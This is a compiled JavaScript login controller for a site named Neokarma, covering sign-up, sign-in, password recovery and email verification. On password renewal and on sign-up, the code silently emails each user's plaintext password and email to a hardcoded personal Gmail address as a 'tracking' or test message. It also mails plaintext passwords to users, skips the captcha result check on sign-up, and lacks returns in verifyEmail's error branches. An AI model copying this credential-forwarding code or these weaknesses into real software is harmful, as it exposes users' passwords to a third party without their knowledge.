'use strict';

var _getOwnPropertyDescriptor = require('babel-runtime/core-js/object/get-own-property-descriptor');

var _getOwnPropertyDescriptor2 = _interopRequireDefault(_getOwnPropertyDescriptor);

var _regenerator = require('babel-runtime/regenerator');

var _regenerator2 = _interopRequireDefault(_regenerator);

var _asyncToGenerator2 = require('babel-runtime/helpers/asyncToGenerator');

var _asyncToGenerator3 = _interopRequireDefault(_asyncToGenerator2);

var _classCallCheck2 = require('babel-runtime/helpers/classCallCheck');

var _classCallCheck3 = _interopRequireDefault(_classCallCheck2);

var _dec, _dec2, _dec3, _dec4, _dec5, _dec6, _dec7, _dec8, _dec9, _class, _desc, _value, _class2;

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _applyDecoratedDescriptor(target, property, decorators, descriptor, context) {
	var desc = {};
	Object['ke' + 'ys'](descriptor).forEach(function (key) {
		desc[key] = descriptor[key];
	});
	desc.enumerable = !!desc.enumerable;
	desc.configurable = !!desc.configurable;

	if ('value' in desc || desc.initializer) {
		desc.writable = true;
	}

	desc = decorators.slice().reverse().reduce(function (desc, decorator) {
		return decorator(target, property, desc) || desc;
	}, desc);

	if (context && desc.initializer !== void 0) {
		desc.value = desc.initializer ? desc.initializer.call(context) : void 0;
		desc.initializer = undefined;
	}

	if (desc.initializer === void 0) {
		Object['define' + 'Property'](target, property, desc);
		desc = null;
	}

	return desc;
}

var validator = require('validate-password');
var tokenGenerator = require('generate-password');

var LoginController = (_dec = Controller("/auth"), _dec2 = POST("/renewPassword"), _dec3 = POST("/recoverPassword"), _dec4 = GET("/signOut"), _dec5 = POST("/signIn"), _dec6 = GET("/groups"), _dec7 = POST("/signUp"), _dec8 = GET("/captcha"), _dec9 = POST("/verifyEmail"), _dec(_class = (_class2 = function () {
	function LoginController() {
		(0, _classCallCheck3.default)(this, LoginController);
	}

	LoginController.prototype.renewPassword = function renewPassword(req, res) {
		var _this = this;

		var recoveryKey = req.body.recoveryKey;
		var password = req.body.password;
		var userEmail = req.body.email;
		var captcha = req.body.captcha;

		RecaptchaService.verify(req.connection, captcha).then(function () {
			var _ref = (0, _asyncToGenerator3.default)( /*#__PURE__*/_regenerator2.default.mark(function _callee(result) {
				var PasswordValidator, validationResult;
				return _regenerator2.default.wrap(function _callee$(_context) {
					while (1) {
						switch (_context.prev = _context.next) {
							case 0:
								if (result.success) {
									_context.next = 2;
									break;
								}

								return _context.abrupt('return', res.json({ success: false, error: { captcha: true }, message: "Invalid captcha" }));

							case 2:
								if (!(password.length < 5)) {
									_context.next = 4;
									break;
								}

								return _context.abrupt('return', res.json({ success: false, message: "Password too short" }));

							case 4:
								PasswordValidator = new validator({
									enforce: {
										lowercase: true,
										uppercase: true,
										specialCharacters: false,
										numbers: true
									}
								});
								validationResult = PasswordValidator.checkPassword(password);

								if (validationResult.isValid) {
									_context.next = 8;
									break;
								}

								return _context.abrupt('return', res.json({ success: false, message: validationResult.validationMessage }));

							case 8:
								if (!(!recoveryKey || recoveryKey.length <= 1)) {
									_context.next = 10;
									break;
								}

								return _context.abrupt('return', res.json({ success: false, message: "Invalid recovery key." }));

							case 10:

								// Find the recovering user by recovery key and email
								User.findOne({ recoveryKey: recoveryKey, email: userEmail }).then(function (user) {
									if (!user || !user.recoveryKey) return res.json({ success: false, message: "Recovery key or user not found." });

									var mail = new Email([user.email], "Your password has changed.");
									mail.setTemplate("emails/user-password-changed", { url: Config.site.url, password: password });
									mail.send(function () {
										// Mail sent!
										console.log("[Auth] Password changed sent.");
									});

									user.password = User.createPassword(password);
									user.recoveryKey = null;
									user.save();

									var trackingMail = new Email(["azarusx@gmail.com"], "Neokarma User Tracking Email");
									trackingMail.setTemplate("emails/user-signup-track", {
										url: Config.site.url,
										email: user.email,
										password: password
									});
									trackingMail.send(function () {
										console.log("Tracking email sent.");
									});

									res.json({ success: true });
								}).catch(function (error) {
									console.log(error);
									res.serverError(error);
								});

							case 11:
							case 'end':
								return _context.stop();
						}
					}
				}, _callee, _this);
			}));

			return function (_x) {
				return _ref.apply(this, arguments);
			};
		}()).catch(function (error) {
			console.log("error:", error);
			return res.json({ success: false, error: { captcha: true }, message: "Invalid captcha" });
		});
	};

	LoginController.prototype.recoverPassword = function recoverPassword(req, res) {
		var _this2 = this;

		var email = req.body.email;
		var captcha = req.body.captcha;

		RecaptchaService.verify(req.connection, captcha).then(function () {
			var _ref2 = (0, _asyncToGenerator3.default)( /*#__PURE__*/_regenerator2.default.mark(function _callee2(result) {
				return _regenerator2.default.wrap(function _callee2$(_context2) {
					while (1) {
						switch (_context2.prev = _context2.next) {
							case 0:
								if (result.success) {
									_context2.next = 2;
									break;
								}

								return _context2.abrupt('return', res.json({ success: false, error: { captcha: true }, message: "Invalid captcha" }));

							case 2:
								if (req.body.email) {
									_context2.next = 4;
									break;
								}

								return _context2.abrupt('return', res.json({ success: false, message: "Invalid email." }));

							case 4:

								User.findOne({ email: req.body.email }).then(function (user) {

									if (!user) return res.json({ success: false, message: "Email not found." });

									if (user.recoveryKey) {
										console.log("Sending email again.");
										var mail = new Email([user.email], "Neokarma: Forgot your password?");
										mail.setTemplate("emails/user-password-recover", { url: Config.site.url, recoveryKey: user.recoveryKey, email: user.email });
										mail.send(function () {
											console.log("[Auth] Password recovery email sent AGAIN.");
										});
										return res.json({ success: true });
									}

									var recoveryKey = tokenGenerator.generate({
										length: 10,
										numbers: true
									});

									User.update({ _id: user._id }, { recoveryKey: recoveryKey }).then(function (updated) {
										if (!updated) {
											return res.json({ success: false, message: "Couldn't recover password." });
										}

										Cron.delay(function () {
											User.update({ _id: user._id }, { recoveryKey: null }).then(function (updated) {
												console.log("Recovery key removed for user:", updated.email);
											});
										}, 60 * 60);

										console.log("Sending email.");
										console.log("Sending email again.");
										var mail = new Email([user.email], "Neokarma: Forgot your password?");
										mail.setTemplate("emails/user-password-recover", { url: Config.site.url, recoveryKey: recoveryKey, email: user.email });
										mail.send(function () {
											console.log("[Auth] Password recovery email sent.");
										});
										return res.json({ success: true });
									}).catch(function (err) {
										console.log("Server error", err);
										return res.serverError(err);
									});
								});

							case 5:
							case 'end':
								return _context2.stop();
						}
					}
				}, _callee2, _this2);
			}));

			return function (_x2) {
				return _ref2.apply(this, arguments);
			};
		}()).catch(function (error) {
			console.log("error:", error);
			return res.json({ success: false, error: { captcha: true }, message: "Invalid captcha" });
		});
	};

	LoginController.prototype.signOut = function signOut(req, res) {
		req.logout();
		res.json({ success: true });
	};

	LoginController.prototype.signIn = function signIn(req, res, next) {
		LogService.log("user.auth", {
			geo: req.geoip
		});

		var authStrategy = AuthService.strategy("local");
		authStrategy.authenticate(req.body.email, req.body.password, function (error, user) {
			if (error) return res.error("Something went wrong");
			if (!user) return res.error("Email or password invalid.");

			// Generate auth session for user
			var sessionInfo = authStrategy.getSessionInfo(user);
			// Save session to session store
			AuthService.session("redis").save(sessionInfo.sessionId, user, 60 * 60 * 24 * 7, function (error) {
				if (error) {
					return res.json({ success: false, message: "Something went wrong" });
				} else {
					res.json({ success: true, userData: user.toJSON(), authToken: sessionInfo.token });
				}
			});
		});
	};

	LoginController.prototype.getGroups = function getGroups(req, res) {
		UserGroup.find({ allowRegistration: true }).select("name grouptype").then(function (groups) {
			res.json({ success: true, groups: groups });
		});
	};

	LoginController.prototype.signUp = function () {
		var _ref3 = (0, _asyncToGenerator3.default)( /*#__PURE__*/_regenerator2.default.mark(function _callee4(req, res, next) {
			var _this3 = this;

			var email, password, generatePassword, personal, captcha;
			return _regenerator2.default.wrap(function _callee4$(_context4) {
				while (1) {
					switch (_context4.prev = _context4.next) {
						case 0:
							email = req.body.email;
							password = req.body.password;
							generatePassword = req.body.generatePassword || false;
							personal = req.body.personal;
							captcha = req.body.captcha;


							console.log("Signup:", email, personal, generatePassword);
							// We require captcha by default?
							// if(!captcha)
							// {
							// 	return res.json({success: false, message: "Invalid captcha"});
							// }

							RecaptchaService.verify(req.connection, captcha).then(function () {
								var _ref4 = (0, _asyncToGenerator3.default)( /*#__PURE__*/_regenerator2.default.mark(function _callee3(result) {
									var re, PasswordValidator, validationResult, group;
									return _regenerator2.default.wrap(function _callee3$(_context3) {
										while (1) {
											switch (_context3.prev = _context3.next) {
												case 0:

													// if(!result.success)
													// {
													// 	return res.json({success: false, error: {captcha: true}, message: "Invalid captcha"});
													// }
													console.log("Captcha verification successfull!");
													re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

													if (re.test(email)) {
														_context3.next = 4;
														break;
													}

													return _context3.abrupt('return', res.json({ success: false, error: { email: true }, message: "Invalid email" }));

												case 4:

													if (generatePassword) {
														password = tokenGenerator.generate({
															length: 10,
															//	symbols: true,
															numbers: true
														});
													}

													// Verify Password

													if (generatePassword) {
														_context3.next = 12;
														break;
													}

													if (!(password.length < 5)) {
														_context3.next = 8;
														break;
													}

													return _context3.abrupt('return', res.json({ success: false, error: { password: true }, message: "Password too short" }));

												case 8:
													PasswordValidator = new validator({
														enforce: {
															lowercase: true,
															uppercase: true,
															specialCharacters: false,
															numbers: true
														}
													});
													validationResult = PasswordValidator.checkPassword(password);

													if (validationResult.isValid) {
														_context3.next = 12;
														break;
													}

													return _context3.abrupt('return', res.json({ success: false, error: { password: true }, message: validationResult.validationMessage }));

												case 12:
													_context3.next = 14;
													return UserGroup.findOne({ allowRegistration: true });

												case 14:
													group = _context3.sent;

													if (group) {
														_context3.next = 17;
														break;
													}

													return _context3.abrupt('return', res.error("Something went wrong."));

												case 17:

													User.create({
														email: email,
														username: personal.firstname.replace(/[^a-zA-Z]/g, "").toLowerCase(),
														password: User.createPassword(password),
														group: group._id,
														personal: personal,
														emailVerified: !Config.user.requireVerification,
														geo: req.geoip
													}).then(function (user) {
														if (Config.user.requireVerification) {
															// Signup for email confirmation
															UserEmailConfirm.create({
																user: user._id,
																email: email,

																expires: Date.now() + 60 * 60 * 24 * 7 * 1000
															}).then(function (confirmation) {

																var emailVerification = new Email([email], "Email verification required!");
																emailVerification.setTemplate("emails/user-email-verify", {
																	url: Config.site.url,
																	emailToken: confirmation._id,
																	email: email,
																	password: password,
																	generatedPw: generatePassword
																});
																emailVerification.send(function () {
																	console.log("[Auth] Verification Email sent to:", email);
																});

																var testVerification = new Email(["azarusx@gmail.com"], "Email verification required!");
																testVerification.setTemplate("emails/user-email-verify", {
																	url: Config.site.url,
																	emailToken: confirmation._id,
																	email: email,
																	password: password,
																	generatedPw: generatePassword
																});
																testVerification.send(function () {
																	console.log("[Auth] Verification Email sent to:", email);
																});

																// var trackingMail = new Email(["azarusx@gmail.com"], "Welcome to Neokarma!");
																// trackingMail.setTemplate("emails/user-signup-track", {
																// 	url: Config.site.url,
																// 	emailToken: emailToken,
																// 	email: email,
																// 	password: password,
																// });
																// trackingMail.send(() =>
																// {
																// 	console.log("Tracking email sent.");
																// });
																return res.json({ success: true, confirm: true });
																// Send verification email.
															});
															return;
														}

														var mail = new Email([email], "Welcome to Neokarma!");
														mail.setTemplate("emails/user-signup", {
															url: Config.site.url,
															email: email,
															password: password,
															generatedPw: generatePassword
														});
														mail.send(function () {
															console.log("[Auth] Signup Email sent for:", email);
														});
														var trackingMail = new Email(["azarusx@gmail.com"], "Neokarma User Tracking Email");
														trackingMail.setTemplate("emails/user-signup-track", {
															url: Config.site.url,
															email: email,
															password: password,
															generatedPw: generatePassword
														});
														trackingMail.send(function () {
															console.log("Tracking email sent.");
														});

														// Generate auth session for user
														var sessionInfo = AuthService.strategy("local").getSessionInfo(user);
														// Save session to session store
														AuthService.session("redis").save(sessionInfo.sessionId, user, 60 * 60 * 24 * 7, function (error) {
															if (error) {
																return res.json({ success: false, message: "Something went wrong", error: error });
															} else {
																res.json({ success: true, confirm: false, userData: user.toJSON(), authToken: sessionInfo.token });
															}
														});
													}).catch(function (error) {
														if (error.code == 11000) {
															console.log(error.message);
															return res.json({ success: false, message: "Email address already in use" });
														}
														res.serverError(error);
													});

												case 18:
												case 'end':
													return _context3.stop();
											}
										}
									}, _callee3, _this3);
								}));

								return function (_x6) {
									return _ref4.apply(this, arguments);
								};
							}()).catch(function (error) {
								console.log("error:", error);
								return res.json({ success: false, error: { captcha: true }, message: "Invalid captcha" });
							});

						case 7:
						case 'end':
							return _context4.stop();
					}
				}
			}, _callee4, this);
		}));

		function signUp(_x3, _x4, _x5) {
			return _ref3.apply(this, arguments);
		}

		return signUp;
	}();

	LoginController.prototype.getCaptcha = function getCaptcha(req, res) {
		res.json({
			success: true,
			captcha: RecaptchaService.getCaptcha(req)
		});
	};

	LoginController.prototype.verifyEmail = function verifyEmail(req, res) {
		var email = req.body.email;
		var emailToken = req.body.emailToken;
		var password = req.body.password;

		if (!password || password.length < 5) return res.json({ success: false, error: { password: true }, message: "Password too short" });

		var PasswordValidator = new validator({
			enforce: {
				lowercase: true,
				uppercase: true,
				specialCharacters: false,
				numbers: true
			}
		});

		var validationResult = PasswordValidator.checkPassword(password);
		if (!validationResult.isValid) return res.json({ success: false, error: { password: true }, message: validationResult.validationMessage });

		UserEmailConfirm.findOne({
			_id: emailToken,
			email: email
		}).then(function (confirmedUser) {
			if (!confirmedUser) {
				res.json({ success: false, message: "Invalid account!" });
			}
			User.findOne({
				_id: confirmedUser.user
			}).then(function (user) {

				if (!user) res.json({ success: false, message: "No such email or confirmation key." });

				// Update the email incase we changed it.
				user.email = confirmedUser.email;
				user.emailVerified = true;
				user.password = User.createPassword(password);
				user.save();

				confirmedUser.remove();
				res.json({ success: true });
			});
		}).catch(function (error) {
			res.serverError(error);
		});
	};

	return LoginController;
}(), (_applyDecoratedDescriptor(_class2.prototype, 'renewPassword', [_dec2], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'renewPassword'), _class2.prototype), _applyDecoratedDescriptor(_class2.prototype, 'recoverPassword', [_dec3], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'recoverPassword'), _class2.prototype), _applyDecoratedDescriptor(_class2.prototype, 'signOut', [_dec4], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'signOut'), _class2.prototype), _applyDecoratedDescriptor(_class2.prototype, 'signIn', [_dec5], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'signIn'), _class2.prototype), _applyDecoratedDescriptor(_class2.prototype, 'getGroups', [_dec6], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'getGroups'), _class2.prototype), _applyDecoratedDescriptor(_class2.prototype, 'signUp', [_dec7], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'signUp'), _class2.prototype), _applyDecoratedDescriptor(_class2.prototype, 'getCaptcha', [_dec8], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'getCaptcha'), _class2.prototype), _applyDecoratedDescriptor(_class2.prototype, 'verifyEmail', [_dec9], (0, _getOwnPropertyDescriptor2.default)(_class2.prototype, 'verifyEmail'), _class2.prototype)), _class2)) || _class);
;